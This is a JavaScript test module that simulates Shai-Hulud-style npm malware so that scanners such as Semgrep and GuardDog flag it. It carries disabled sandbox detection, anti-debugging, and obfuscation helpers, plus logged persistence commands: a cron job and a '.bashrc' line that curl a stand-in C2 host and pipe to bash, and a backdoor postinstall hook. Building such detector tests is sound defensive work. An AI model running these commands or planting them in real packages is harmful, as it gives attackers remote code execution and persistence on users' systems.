/**
 * SHAI-HULUD SIMULATION - Evasion Utilities
 * FOR SECURITY TESTING ONLY - DO NOT USE IN PRODUCTION
 * 
 * SIGNALS THIS SHOULD TRIGGER:
 * - Semgrep: CWE-78 (command injection patterns)
 * - Semgrep: detect-child-process
 * - GuardDog: shell-command-execution
 * - GuardDog: process-spawn
 */

'use strict';

const { exec, spawn } = require('child_process');
const os = require('os');

/**
 * Execute shell command (for evasion/persistence)
 * CWE-78: OS Command Injection
 */
const executeCommand = (cmd) => {
    console.log(`[SHAI-HULUD] Would execute: ${cmd}`);
    // Commented out for safety - but pattern triggers detection
    // exec(cmd, (err, stdout, stderr) => {});
    return { executed: false, reason: 'disabled-for-safety' };
};

/**
 * Spawn detached process (persistence technique)
 */
const spawnDetached = (binary, args) => {
    console.log(`[SHAI-HULUD] Would spawn: ${binary} ${args.join(' ')}`);
    // Commented out for safety
    // spawn(binary, args, { detached: true, stdio: 'ignore' }).unref();
    return { spawned: false, reason: 'disabled-for-safety' };
};

/**
 * Check if running as root/admin
 */
const checkPrivileges = () => {
    return {
        isRoot: process.getuid && process.getuid() === 0,
        isAdmin: os.userInfo().username === 'root' || 
                 os.userInfo().username === 'Administrator'
    };
};

/**
 * Sandbox detection techniques
 */
const detectSandbox = () => {
    const indicators = {
        // VM detection
        isVM: false,
        // Container detection  
        isContainer: false,
        // CI environment
        isCI: !!(process.env.CI || process.env.GITHUB_ACTIONS || 
                 process.env.JENKINS_URL || process.env.GITLAB_CI),
        // Analysis environment
        isAnalysis: !!(process.env.SANDBOX || process.env.MALWARE_ANALYSIS)
    };
    
    // Check for container
    try {
        const fs = require('fs');
        if (fs.existsSync('/.dockerenv') || 
            fs.existsSync('/run/.containerenv')) {
            indicators.isContainer = true;
        }
    } catch (e) {}
    
    return indicators;
};

/**
 * Anti-debugging techniques
 */
const antiDebug = () => {
    // Check for debugger
    const hasDebugger = typeof v8debug === 'object' ||
                        /--inspect/.test(process.execArgv.join(' '));
    
    // Check execution timing (debuggers slow execution)
    const start = Date.now();
    for (let i = 0; i < 1000000; i++) {}
    const elapsed = Date.now() - start;
    const isSlow = elapsed > 100; // Suspiciously slow
    
    return { hasDebugger, isSlow };
};

/**
 * Persistence mechanisms (disabled for safety)
 * These patterns should trigger detection rules
 */
const persistenceMethods = {
    // Cron job injection
    cronJob: () => {
        const cmd = '(crontab -l 2>/dev/null; echo "*/5 * * * * curl http://c2.test/beacon") | crontab -';
        console.log('[SHAI-HULUD] Would install cron:', cmd);
        return { installed: false };
    },
    
    // Bash profile injection
    bashProfile: () => {
        const payload = 'curl -s http://c2.test/update | bash';
        console.log('[SHAI-HULUD] Would inject into .bashrc:', payload);
        return { installed: false };
    },
    
    // npm hook injection
    npmHook: () => {
        const hook = { scripts: { postinstall: 'node backdoor.js' }};
        console.log('[SHAI-HULUD] Would modify package.json:', JSON.stringify(hook));
        return { installed: false };
    }
};

/**
 * String obfuscation utilities
 */
const obfuscate = {
    // ROT13
    rot13: (str) => str.replace(/[a-zA-Z]/g, c => 
        String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26)),
    
    // Hex encode
    toHex: (str) => Buffer.from(str).toString('hex'),
    
    // Base64
    toBase64: (str) => Buffer.from(str).toString('base64'),
    
    // Reverse
    reverse: (str) => str.split('').reverse().join('')
};

module.exports = {
    executeCommand,
    spawnDetached,
    checkPrivileges,
    detectSandbox,
    antiDebug,
    persistenceMethods,
    obfuscate
};
